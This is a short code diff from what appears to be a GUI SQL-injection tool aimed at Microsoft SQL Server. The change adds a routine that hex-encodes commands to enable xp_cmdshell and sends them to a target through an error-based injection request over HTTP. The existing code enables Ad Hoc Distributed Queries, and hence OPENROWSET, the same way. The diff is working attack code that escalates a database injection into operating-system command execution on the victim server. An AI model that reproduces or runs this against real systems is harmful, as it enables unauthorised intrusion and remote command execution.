@@ -132,7 +132,7 @@ class OpenrowsetWidget(QtGui.QWidget):
         #---
         self.worker.start()
 
-    #Enable openrowset button click
+    #Enable button click
     def enableButton_OnClick(self):
         if self.isBusy():
             return
@@ -289,7 +289,7 @@ class Worker(QtCore.QThread):
         if self.vars['task'] == "connection_test":
             self.connTest()
         elif self.vars['task'] == "enable":
-            self.enableOpenrowset()
+            self.enableFeatures()
         else:
             self.opernrowsetWorker()
         self.taskDoneSignal.emit()
@@ -305,7 +305,13 @@ class Worker(QtCore.QThread):
             return
         self.connResultSignal.emit(True)
         
-    def enableOpenrowset(self):
+    def enableFeatures(self):
+        #Enbale xp_cmdshell request
+        hex = core.txtproc.strToHex(\
+        "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure", True)
+        query =  self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
+        self.wq.httpRequest(query, True, self.vars)
+
         #Enbale openrowset request
         hex = core.txtproc.strToHex(\
         "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure", True)
